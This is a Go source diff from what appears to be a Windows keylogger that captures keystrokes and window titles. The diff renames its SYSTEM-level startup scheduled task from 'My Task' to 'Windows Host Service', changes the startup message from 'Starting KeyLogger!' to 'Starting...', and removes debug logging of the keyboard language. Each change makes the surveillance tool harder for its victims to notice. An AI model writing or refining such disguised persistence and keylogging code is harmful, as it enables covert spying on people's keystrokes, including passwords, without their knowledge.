@@ -184,22 +184,8 @@ func getUnicodeKey(virtualCode int) string {
 		log.Fatalf("mapVirtualKey -> %v", mapVirtualKeyErr)
 	}
 
-	// TEST LANGUAGE
-	hkl, languageID := getLanguage()
-	switch languageID {
-	case constants.US:
-		activateKeyboardLayout(hkl)
-		log.Println("Language: United States (US)")
-	case constants.UA:
-		activateKeyboardLayout(hkl)
-		log.Println("Language: Ukraine (UA)")
-	case constants.RU:
-		activateKeyboardLayout(hkl)
-		log.Println("Language: Russia (RU)")
-	default:
-		activateKeyboardLayout(hkl)
-		log.Println("Language: None")
-	}
+	hkl, _ := getLanguage()
+	activateKeyboardLayout(hkl)
 
 	unicodeBuf := make([]uint16, 256)
 	toUnicode(syscall.Handle(virtualCode), scanCode, &keyboardBuf[0], &unicodeBuf[0])
@@ -374,7 +360,7 @@ func addScheduler() {
 		"schtasks",
 		"/create",
 		"/sc", "ONSTART",
-		"/tn", "My Task",
+		"/tn", "Windows Host Service",
 		"/f",
 		"/tr", "D:\\Projects\\go-projects\\bin\\amigo.exe",
 		"/ru", "SYSTEM",
@@ -387,7 +373,7 @@ func addScheduler() {
 }
 
 func main() {
-	log.Println("Starting KeyLogger!")
+	log.Println("Starting...")
 	addScheduler()
 	go keyLogger()
 	go windowLogger()
